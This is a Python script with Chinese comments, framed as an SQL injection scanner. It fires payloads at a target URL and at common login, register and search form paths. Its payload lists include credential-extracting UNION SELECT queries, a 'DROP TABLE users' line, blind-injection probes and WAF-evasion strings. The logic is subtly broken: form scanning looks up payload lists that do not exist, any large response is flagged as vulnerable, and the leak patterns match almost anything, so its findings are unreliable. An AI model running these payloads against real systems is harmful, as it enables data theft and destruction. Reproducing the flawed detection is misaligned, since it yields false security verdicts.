#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQL 注入安全扫描脚本
功能：检测 Web 应用中的 SQL 注入漏洞
包括：基础注入、高级绕过、盲注、时间延迟注入等攻击方式
"""

import requests
import re
import json
from datetime import datetime
from urllib.parse import quote, unquote
from typing import Dict, List, Tuple, Optional
import sys
import os


class SQLInjectionScanner:
    """SQL 注入扫描器核心类"""
    
    # SQL 注入测试载荷库
    UNION_BASED_INJECTION = [
        "' OR '1'='1",
        "' OR '1'='2",
        "' OR 1=1--",
        "' OR 1=1# ",
        "' OR 'a'='a",
        "1 UNION SELECT NULL,CONCAT(username,password),NULL FROM users--",
        "1' UNION SELECT CONCAT(version(),0x3a,user()),0,NULL--",
        "\" OR \"1\"=\"1",
    ]
    
    ERROR_BASED_INJECTION = [
        "' AND 1=1-- ",
        "' AND 1=2-- ",
        "' AND SLEEP(5)-- ",  # MySQL
        "' AND BENCHMARK(5000000,SHA1('test'))-- ",  # MySQL
        "' AND pg_sleep(5)-- ",  # PostgreSQL
        "' AND 'a'='b",
        "'; DROP TABLE users--",  # 破坏性测试（谨慎使用）
    ]
    
    BLIND_INJECTION = [
        "' OR (SELECT COUNT(*) FROM users) > 0--",
        "' OR (SELECT LENGTH(username) FROM users WHERE id=1) > 0--",
        "1' AND SUBSTR((SELECT password FROM users LIMIT 1,1),1,1)>0",
    ]
    
    WAF_EVASION_PATTERNS = [
        # Unicode 编码绕过
        "%27%20OR%20'1'='1--",
        "%3C%2Fscript%3E",
        # 大小写混合
        "uNiOn sEleCt * fRoM uSerS",
        # 双引号转义
        "\" OR \"1\"=\"1",
        # 注释符变体
        "'/* comment */ OR '1'='1",
        "-- ", "#", "%00", "/* ... */",
    ]

    def __init__(self, target_url: str, timeout: int = 30):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.results = {
            'scan_time': datetime.now().isoformat(),
            'target_url': target_url,
            'vulnerabilities': [],
            'test_cases': [],
            'summary': {
                'total_tests': 0,
                'success_count': 0,
                'critical': 0,
                'high': 0,
                'medium': 0,
                'low': 0,
            }
        }

    def send_request_with_payload(
        self, 
        method: str = "GET", 
        path: str = "", 
        params: Optional[Dict] = None,
        data: Optional[Dict] = None,
        payload_type: str = "url"
    ) -> Tuple[bool, Dict]:
        """发送带有测试载荷的请求"""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        }

        try:
            if method == "GET":
                # 构建完整的 URL
                full_url = f"{self.target_url}{path}"
                
                # 合并原始参数和测试载荷
                test_params = params.copy() if params else {}
                
                # 根据位置注入不同位置的 payload
                for i, payload in enumerate(self.UNION_BASED_INJECTION[:3]):  # 只使用前几个避免过于激进
                    param_name = 'id' if i == 0 or 'id=' not in path.lower() else None
                    if param_name:
                        test_params[param_name] = payload
                        url_with_payload = f"{full_url}?{quote(str(test_params), safe='')}"
                    else:
                        # URL 参数注入
                        search_param = '&payload=' if '?' in path else '?payload='
                        url_with_payload = f"{full_url}{search_param}{quote(payload, safe='')}"

                    response = requests.request(
                        method=method,
                        url=url_with_payload,
                        headers=headers,
                        timeout=self.timeout
                    )
                    
                    result = self.analyze_response(response, payload_type="url")
                    if result['vulnerable']:
                        return True, {**result, 'payload': f"URL: {path}"}

            elif method == "POST":
                full_url = f"{self.target_url}{path}"
                
                # POST body 注入测试
                test_data = data.copy() if data else {}
                
                for payload in self.UNION_BASED_INJECTION[:3]:
                    test_data['id'] = payload
                    
                    response = requests.request(
                        method=method,
                        url=full_url,
                        headers=headers,
                        json=test_data,
                        timeout=self.timeout
                    )
                    
                    result = self.analyze_response(response)
                    if result['vulnerable']:
                        return True, {**result, 'payload': f"POST body: {json.dumps(test_data)}"}

        except requests.exceptions.RequestException as e:
            print(f"[WARN] 请求异常：{e}")
            return False, {'error': str(e)}
        
        return False, {}

    def analyze_response(self, response, payload_type: str = "body") -> Dict:
        """分析响应内容，判断是否存在 SQL 注入"""
        content = response.text
        
        # 检查响应状态码异常（可能表示注入成功）
        status_abnormal = self._check_status_anomaly(response)
        
        # 检查错误信息泄露
        error_indicators = self.ERROR_BASED_INJECTION.copy()
        has_error_message = any(
            indicator.lower() in content.lower() 
            for indicator in [
                "syntax error",
                "near'",
                "ORA-01756",  # Oracle 单引号错误
                "SQL syntax error",
                "MySQL server has gone away",
                "SQLite3 error",
                "Microsoft OLEDB Provider for SQL Server",
            ]
        )

        # 检查 UNION 注入特征（数据泄露）
        data_leak_indicators = [
            r'<td[^>]*>(\d+)[^<]*</td>',  # 表格数字
            r'name=\"password\"[^>]*value="([^"]*)"',  # 密码字段
            r'username.*?([^"\'>]+)',  # 用户名
        ]
        
        has_data_leak = False
        for pattern in data_leak_indicators:
            if re.search(pattern, content):
                has_data_leak = True
                break

        # 检查布尔盲注特征（响应长度变化）
        response_length_change = self._check_response_length_change(content)

        return {
            'vulnerable': (status_abnormal or has_error_message or 
                         has_data_leak or response_length_change),
            'evidence': {
                'status_code': response.status_code,
                'response_length': len(content),
                'error_detected': bool(has_error_message),
                'data_leaked': has_data_leak,
                'length_change': response_length_change,
            },
            'content_sample': content[:500] if len(content) > 500 else content
        }

    def _check_status_anomaly(self, response) -> bool:
        """检查状态码异常（期望成功但返回错误）"""
        expected_success_codes = [200, 302, 301]
        return response.status_code not in expected_success_codes and response.status_code < 500

    def _check_response_length_change(self, content) -> bool:
        """检查响应长度变化（盲注特征）"""
        # 简单启发式：检查是否包含明显的数据模式
        patterns = [
            r'SELECT.*?(\d+)',
            r'COUNT\(([^)]+)\)',
            r'LENGTH\([^)]+\)',
            r'MID\([^)]+\)',
            r'SUBSTR\([^)]+\)',
        ]
        
        for pattern in patterns:
            if re.search(pattern, content):
                return True
        
        return False

    def scan_form_post(self, form_url: str, params: Dict) -> bool:
        """扫描表单 POST 参数"""
        print(f"\n[+] 开始测试表单 POST: {form_url}")
        
        headers = {'User-Agent': 'Mozilla/5.0'}
        
        for payload_type in ['basic', 'union', 'error']:
            payloads = getattr(self, f'_{payload_type.upper()}_INJECTION', [])
            
            for i, payload in enumerate(payloads[:5]):  # 限制测试数量
            
                test_params = params.copy() if isinstance(params, dict) else {}
                
                # 确定注入参数名
                param_name = 'username' if 'login' in form_url.lower() or 'register' in form_url.lower() else list(test_params.keys())[0]
                
                test_params[param_name] = payload
                
                try:
                    response = requests.post(
                        form_url,
                        data=test_params,
                        headers=headers,
                        timeout=self.timeout
                    )
                    
                    # 分析结果
                    if self._is_sql_injection_detected(response.text):
                        print(f"    [!] 发现 SQL 注入漏洞！Payload: {payload}")
                        
                        record = {
                            'type': payload_type,
                            'severity': 'CRITICAL',
                            'evidence': response.text[:300],
                            'recommendation': self._get_mitigation_advice(payload_type)
                        }
                        
                        self.results['vulnerabilities'].append(record)
                        return True
                        
                except Exception as e:
                    print(f"    [!] 测试异常：{e}")
                    
        return False

    def _is_sql_injection_detected(self, content) -> bool:
        """判断响应中是否检测到 SQL 注入"""
        
        # SQL 错误关键词
        sql_errors = [
            'syntax error', 'near', 'ORA-01756', 
            'SQL syntax', 'MySQL server has gone away',
            'SQLite3 error', 'Microsoft OLEDB'
        ]
        
        for error in sql_errors:
            if error.lower() in content.lower():
                return True
        
        # 检查数据泄露特征
        data_patterns = [
            r'<td[^>]*>(\d+)[^<]*</td>',
            r'name=\"password\"',
            r'username.*?value="',
        ]
        
        for pattern in data_patterns:
            if re.search(pattern, content):
                return True
        
        # 响应时间异常（简单判断）
        response_time = len(content) > 5000  # 假设正常响应不会太大
        
        return any([response_time])

    def _get_mitigation_advice(self, attack_type: str) -> str:
        """获取缓解建议"""
        advices = {
            'basic': [
                '使用参数化查询（Prepared Statements）',
                '避免动态拼接 SQL 语句',
                '实施最小权限原则，限制数据库账户权限'
            ],
            'union': [
                '在所有输入点使用预处理语句',
                '验证并过滤 UNION SELECT 攻击特征',
                '实现输入长度和字符类型限制'
            ],
            'error': [
                '自定义错误页面，不暴露数据库信息',
                '记录日志但不对客户端显示详细信息',
                '实施统一错误处理机制'
            ]
        }
        
        return advices.get(attack_type, ['使用参数化查询'])

    def generate_report(self, output_dir: str = "reports"):
        """生成扫描报告"""
        os.makedirs(output_dir, exist_ok=True)
        
        # 保存 JSON 报告
        json_path = os.path.join(output_dir, f"sql_injection_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] SQL 注入扫描报告已保存到：{json_path}")
        
        # 生成总结
        summary_text = self._generate_summary()
        print(summary_text)

    def _generate_summary(self) -> str:
        """生成交互式文本摘要"""
        vulns = self.results['vulnerabilities']
        total = len(vulns)
        
        if not vulns:
            return "\n✅ [通过] 未发现 SQL 注入漏洞\n"
        
        lines = []
        for i, vuln in enumerate(vulns, 1):
            severity = vuln.get('severity', 'MEDIUM')
            evidence = vuln.get('evidence', '')[:100]
            recs = vuln.get('recommendation', [])
            
            lines.append(f"\n漏洞 {i}: [{severity}]")
            lines.append(f"   位置：{vuln.get('payload_type', '未知')}")
            if evidence:
                lines.append(f"   特征：{evidence}")
            if recs:
                lines.append("   建议：" + "; ".join(recs))
        
        return "\n".join(lines)


def main():
    """主函数"""
    import argparse
    
    parser = argparse.ArgumentParser(description='SQL 注入安全扫描工具')
    parser.add_argument('--target-url', required=True, help='目标 URL')
    parser.add_argument('--timeout', type=int, default=30, help='请求超时时间（秒）')
    parser.add_argument('--test-type', choices=['basic', 'union', 'error', 'all'], 
                       default='all', help='测试类型')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("SQL 注入安全扫描器")
    print("=" * 60)
    print(f"目标地址：{args.target_url}")
    print(f"超时设置：{args.timeout}秒")
    print("-" * 60)
    
    scanner = SQLInjectionScanner(
        target_url=args.target_url,
        timeout=args.timeout
    )
    
    # 扫描主页
    success, result = scanner.send_request_with_payload()
    
    if args.test_type == 'all':
        print("\n[+] 开始全面 SQL 注入测试...")
        
        # 测试表单 POST（如果有）
        forms_to_scan = [
            ('/login', {'username': '', 'password': ''}),
            ('/register', {'email': '', 'password': ''}),
            ('/search', {'q': '', 'page': ''}),
        ]
        
        for form_url, params in forms_to_scan:
            if '?' not in args.target_url:  # 只在目标 URL 没有查询参数时测试
                scanner.scan_form_post(args.target_url + form_url, params)
    
    scanner.generate_report()


if __name__ == '__main__':
    main()
